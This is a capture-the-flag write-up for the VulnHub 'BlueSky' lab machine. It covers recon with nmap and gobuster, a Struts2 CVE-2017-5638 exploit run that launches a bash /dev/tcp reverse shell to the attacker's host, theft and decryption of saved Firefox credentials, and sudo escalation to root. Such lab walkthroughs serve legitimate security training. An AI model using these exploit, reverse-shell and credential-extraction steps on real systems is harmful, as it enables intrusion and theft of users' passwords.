# OSCP Prep - *BlueSky*

## Objective

We must go from visiting a simple website to having root access over the entire web server.

We'll download the VM from [here](https://www.vulnhub.com/entry/bluesky-1,623/) and set it up with VMWare Workstation Pro 16.

Once the machine is up, we get to work.

## Step 1 - Reconnaissance Part 1

After finding our IP address using ```ifconfig``` and locating the second host on the network, we can run an Nmap scan to probe it for information.

```
$ sudo nmap -sS -Pn -v -T4 -p- 192.168.159.179
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-21 22:14 EDT
Initiating ARP Ping Scan at 22:14
Scanning 192.168.159.179 [1 port]
Completed ARP Ping Scan at 22:14, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:14
Completed Parallel DNS resolution of 1 host. at 22:14, 0.00s elapsed
Initiating SYN Stealth Scan at 22:14
Scanning 192.168.159.179 [65535 ports]
Discovered open port 8080/tcp on 192.168.159.179
Discovered open port 22/tcp on 192.168.159.179
Completed SYN Stealth Scan at 22:14, 0.94s elapsed (65535 total ports)
Nmap scan report for 192.168.159.179
Host is up (0.00048s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
MAC Address: 00:0C:29:40:15:90 (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.15 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

This scan reveals that there's most likely a web server running on port 8080.

Further scanning with the help of some NSE scripts reveals the following.

```
$ sudo nmap -sS -sV -sC -PA -A -T4 -v -Pn -n -f --version-all --osscan-guess --script http-enum.nse,http-headers.nse,http-methods.nse,http-auth.nse,http-brute.nse -p 22,8080 192.168.159.179
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-21 22:15 EDT
NSE: Loaded 50 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 22:15
Completed NSE at 22:15, 0.00s elapsed
Initiating NSE at 22:15
Completed NSE at 22:15, 0.00s elapsed
Initiating ARP Ping Scan at 22:15
Scanning 192.168.159.179 [1 port]
Completed ARP Ping Scan at 22:15, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:15
Scanning 192.168.159.179 [2 ports]
Discovered open port 22/tcp on 192.168.159.179
Discovered open port 8080/tcp on 192.168.159.179
Completed SYN Stealth Scan at 22:15, 0.04s elapsed (2 total ports)
Initiating Service scan at 22:15
Scanning 2 services on 192.168.159.179
Completed Service scan at 22:15, 6.30s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 192.168.159.179
NSE: Script scanning 192.168.159.179.
Initiating NSE at 22:15
Completed NSE at 22:15, 4.14s elapsed
Initiating NSE at 22:15
Completed NSE at 22:15, 0.00s elapsed
Nmap scan report for 192.168.159.179
Host is up (0.00037s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat 9.0.40
| http-brute:   
|_  Path "/" does not require authentication
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-headers: 
|   Content-Type: text/html;charset=UTF-8
|   Transfer-Encoding: chunked
|   Date: Sat, 22 Oct 2022 02:15:15 GMT
|   Connection: close
|   
|_  (Request type: HEAD)
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 )
|   /manager/html: Apache Tomcat (401 )
|_  /docs/: Potentially interesting folder
MAC Address: 00:0C:29:40:15:90 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 198.839 days (since Wed Apr  6 02:07:27 2022)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.37 ms 192.168.159.179

NSE: Script Post-scanning.
Initiating NSE at 22:15
Completed NSE at 22:15, 0.00s elapsed
Initiating NSE at 22:15
Completed NSE at 22:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.35 seconds
           Raw packets sent: 25 (1.894KB) | Rcvd: 17 (1.366KB)
```

A nikto scan tells us mostly the same information.

```
$ sudo nikto -host http://192.168.159.179:8080
[sudo] password for meowmycks: 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.159.179
+ Target Hostname:    192.168.159.179
+ Target Port:        8080
+ Start Time:         2022-10-21 22:15:21 (GMT-4)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /host-manager/status: Default Tomcat Server Status interface found
+ 8069 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2022-10-21 22:15:40 (GMT-4) (19 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Upon seeing the "Allowed HTTP Methods" include PUT and DELETE, I tried to find where exactly they were allowed.

This turned out to be a red herring and not worth investigating.

Attempting to access the ```host-manager``` and ```manager``` pages proved to be wastes of time as well.

However, running gobuster scans revealed a ```struts2-showcase``` directory.

```
$ sudo gobuster fuzz -u http://192.168.159.179:8080/FUZZ -w wordlists/whiteknight7/dir.txt -b 404,403,400 -k                   
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.159.179:8080/FUZZ
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                wordlists/whiteknight7/dir.txt
[+] Excluded Status codes:   404,403,400
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/10/22 00:50:48 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=302] [Length=0] http://192.168.159.179:8080/struts2-showcase
Found: [Status=302] [Length=0] http://192.168.159.179:8080/docs
Found: [Status=302] [Length=0] http://192.168.159.179:8080/examples
Found: [Status=200] [Length=21630] http://192.168.159.179:8080/favicon.ico
Found: [Status=302] [Length=0] http://192.168.159.179:8080/host-manager
Found: [Status=302] [Length=0] http://192.168.159.179:8080/manager
===============================================================
2022/10/22 00:50:49 Finished
===============================================================
```

## Step 2 - Exploitation

Apache's Struts2 application has a known RCE vulnerability.

A PoC exploit can be found on [this](https://github.com/jrrdev/cve-2017-5638) Github page.

To test if the exploit would work here, the ```whoami``` command was used, resulting in this payload:

```
$ python2.7 exploit.py http://192.168.159.179:8080/struts2-showcase/ "whoami" 
[*] CVE: 2017-5638 - Apache Struts2 S2-045
[*] cmd: whoami

minhtuan
```

Therefore, RCE was achieved.

To open a reverse shell, the payload was changed to a simple Bash bind shell command.

```
$ python2.7 exploit.py http://192.168.159.179:8080/struts2-showcase/ "bash -i >& /dev/tcp/192.168.159.128/4444 0>&1"
[*] CVE: 2017-5638 - Apache Struts2 S2-045
[*] cmd: bash -i >& /dev/tcp/192.168.159.128/4444 0>&1
```

A Netcat listener was also opened on the attacker's machine to anticipate the injected bind shell command.

```
$ sudo nc -lvnp 4444
[sudo] password for meowmycks: 
listening on [any] 4444 ...
connect to [192.168.159.128] from (UNKNOWN) [192.168.159.179] 42220
bash: cannot set terminal process group (653): Inappropriate ioctl for device
bash: no job control in this shell
minhtuan@ubuntu:~$
```

The shell was upgraded to a TTY shell.

```
minhtuan@ubuntu:~$ python3 -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
minhtuan@ubuntu:~$ ^Z
zsh: suspended  sudo nc -lvnp 4444
                                                                                                                    
$ stty raw -echo    
  └─$ fg
[1]  + continued  sudo nc -lvnp 4444


minhtuan@ubuntu:~$ reset   
reset
reset: unknown terminal type unknown
Terminal type? xterm-256color
xterm-256color
minhtuan@ubuntu:~$export TERM=xterm-256color
export TERM=xterm-256color
minhtuan@ubuntu:~$ export SHELL=bash
export SHELL=bash
minhtuan@ubuntu:~$
```

## Step 3 - Privilege Escalation

In the home directory of ```minhtuan```, there was a hidden folder labeled ```.mozilla```.

After some directory searching, two files labeled ```key4.db``` and ```logins.json``` were discovered.

```
minhtuan@ubuntu:~/.mozilla/firefox$ cd fvbljmev.default-release/
cd fvbljmev.default-release/
minhtuan@ubuntu:~/.mozilla/firefox/fvbljmev.default-release$ ll -a
ll -a
total 11756
drwx------ 12 minhtuan minhtuan    4096 Dec  6  2020 ./
drwx------  6 minhtuan minhtuan    4096 Dec  6  2020 ../
-rw-------  1 minhtuan minhtuan      24 Dec  6  2020 addons.json
-rw-------  1 minhtuan minhtuan    2361 Dec  6  2020 addonStartup.json.lz4
-rw-rw-r--  1 minhtuan minhtuan       0 Dec  6  2020 AlternateServices.txt
drwx------  2 minhtuan minhtuan    4096 Dec  6  2020 bookmarkbackups/
-rw-------  1 minhtuan minhtuan     216 Dec  6  2020 broadcast-listeners.json
-rw-------  1 minhtuan minhtuan  229376 Dec  6  2020 cert9.db
-rw-rw-r--  1 minhtuan minhtuan       0 Dec  6  2020 ClientAuthRememberList.txt
-rw-------  1 minhtuan minhtuan     160 Dec  6  2020 compatibility.ini
-rw-------  1 minhtuan minhtuan     939 Dec  6  2020 containers.json
-rw-r--r--  1 minhtuan minhtuan  229376 Dec  6  2020 content-prefs.sqlite
-rw-r--r--  1 minhtuan minhtuan  524288 Dec  6  2020 cookies.sqlite
drwx------  3 minhtuan minhtuan    4096 Dec  6  2020 crashes/
drwx------  3 minhtuan minhtuan    4096 Dec  6  2020 datareporting/
-rw-------  1 minhtuan minhtuan     926 Dec  6  2020 extension-preferences.json
drwx------  2 minhtuan minhtuan    4096 Dec  6  2020 extensions/
-rw-------  1 minhtuan minhtuan   34675 Dec  6  2020 extensions.json
-rw-r--r--  1 minhtuan minhtuan 5242880 Dec  6  2020 favicons.sqlite
-rw-r--r--  1 minhtuan minhtuan  262144 Dec  6  2020 formhistory.sqlite
drwxr-xr-x  3 minhtuan minhtuan    4096 Dec  6  2020 gmp-gmpopenh264/
-rw-------  1 minhtuan minhtuan     683 Dec  6  2020 handlers.json
-rw-------  1 minhtuan minhtuan  294912 Dec  6  2020 key4.db
lrwxrwxrwx  1 minhtuan minhtuan      15 Dec  6  2020 lock -> 127.0.1.1:+1058
-rw-------  1 minhtuan minhtuan     660 Dec  6  2020 logins.json
drwx------  2 minhtuan minhtuan    4096 Dec  6  2020 minidumps/
-rw-rw-r--  1 minhtuan minhtuan       0 Dec  6  2020 .parentlock
-rw-r--r--  1 minhtuan minhtuan   98304 Dec  6  2020 permissions.sqlite
-rw-------  1 minhtuan minhtuan     480 Dec  6  2020 pkcs11.txt
-rw-r--r--  1 minhtuan minhtuan 5242880 Dec  6  2020 places.sqlite
-rw-------  1 minhtuan minhtuan    9276 Dec  6  2020 prefs.js
-rw-r--r--  1 minhtuan minhtuan   65536 Dec  6  2020 protections.sqlite
drwx------  2 minhtuan minhtuan    4096 Dec  6  2020 saved-telemetry-pings/
-rw-------  1 minhtuan minhtuan     326 Dec  6  2020 search.json.mozlz4
-rw-rw-r--  1 minhtuan minhtuan       0 Dec  6  2020 SecurityPreloadState.txt
drwxrwxr-x  2 minhtuan minhtuan    4096 Dec  6  2020 security_state/
-rw-rw-r--  1 minhtuan minhtuan     149 Dec  6  2020 serviceworker.txt
-rw-------  1 minhtuan minhtuan     288 Dec  6  2020 sessionCheckpoints.json
drwx------  2 minhtuan minhtuan    4096 Dec  6  2020 sessionstore-backups/
-rw-------  1 minhtuan minhtuan    5766 Dec  6  2020 sessionstore.jsonlz4
-rw-------  1 minhtuan minhtuan      18 Dec  6  2020 shield-preference-experiments.json
-rw-rw-r--  1 minhtuan minhtuan     852 Dec  6  2020 SiteSecurityServiceState.txt
drwxr-xr-x  5 minhtuan minhtuan    4096 Dec  6  2020 storage/
-rw-r--r--  1 minhtuan minhtuan    4096 Dec  6  2020 storage.sqlite
-rw-------  1 minhtuan minhtuan      50 Dec  6  2020 times.json
-rw-r--r--  1 minhtuan minhtuan   98304 Dec  6  2020 webappsstore.sqlite
-rw-------  1 minhtuan minhtuan     218 Dec  6  2020 xulstore.json
```

These two files are used by Mozilla to store saved login credentials.

The credentials were decrypted and recovered using [this tool](https://github.com/lclevy/firepwd).

The two files were downloaded to the attacking machine using ```wget```

```
$ mkdir loot; cd loot

$ wget http://192.168.159.179:8000/key4.db                                          
--2022-10-22 00:12:27--  http://192.168.159.179:8000/key4.db
Connecting to 192.168.159.179:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 294912 (288K) [application/octet-stream]
Saving to: ‘key4.db’

key4.db                                                    100%[========================================================================================================================================>] 288.00K  --.-KB/s    in 0.001s  

2022-10-22 00:12:27 (191 MB/s) - ‘key4.db’ saved [294912/294912]

$ wget http://192.168.159.179:8000/logins.json
--2022-10-22 00:12:31--  http://192.168.159.179:8000/logins.json
Connecting to 192.168.159.179:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 660 [application/json]
Saving to: ‘logins.json’

logins.json                                                100%[========================================================================================================================================>]     660  --.-KB/s    in 0s      

2022-10-22 00:12:31 (187 MB/s) - ‘logins.json’ saved [660/660]
```

The files were then decrypted and credentials were successfully recovered.

```
$ python3 firepwd.py -h
Usage: firepwd.py [options]

Options:
  -h, --help            show this help message and exit
  -v VERBOSE, --verbose=VERBOSE
                        verbose level
  -p MASTERPASSWORD, --password=MASTERPASSWORD
                        masterPassword
  -d DIRECTORY, --dir=DIRECTORY
                        directory

$ python3 firepwd.py -d ./loot
globalSalt: b'5932ff5878417b64a4049f8d9ce7b3ab247fde15'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'5a7912074f9ddf6b381316126704a5479794dcf75aca047f45e2b54b3f0e6d79'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'7366afcc6bf9cacc1fa25fa3961a'
       }
     }
   }
   OCTETSTRING b'1c74cace1e1e37252aea0d28aafb2399'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'c0c32a0189ed3b0db160c739a54c821da4fd5572d3ee79cb36533bc7d11a49d0'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'4b11e722902bc3a1bf51be57de22'
       }
     }
   }
   OCTETSTRING b'c6158b0d1e7a81ce468f9d24624daa581ee8095b6f4596242ef2dbf30b300b5b'
 }
clearText b'540b76c41a46b9dcecc4c15449c785011546bcf84cfe9b700808080808080808'
decrypting login/password pairs
 https://twitter.com:b'minhtuan',b'skysayohyeah'
```

Upon trying a ```sudo su``` with the credentials ```minhtuan:skysayohyeah```, privilege escalation was successful.

```
minhtuan@ubuntu:~/.mozilla/firefox/fvbljmev.default-release$ sudo su
sudo su
[sudo] password for minhtuan: skysayohyeah

root@ubuntu:/home/minhtuan/.mozilla/firefox/fvbljmev.default-release#
```

Finally, the flag was obtained.

```
root@ubuntu:/home/minhtuan/.mozilla/firefox/fvbljmev.default-release# cd /root
cd /root
root@ubuntu:~# ls
ls
root.txt
root@ubuntu:~# cat root.txt
cat root.txt
Amazing, goodjob you!
Thank you for going here

SunCSR Team

```
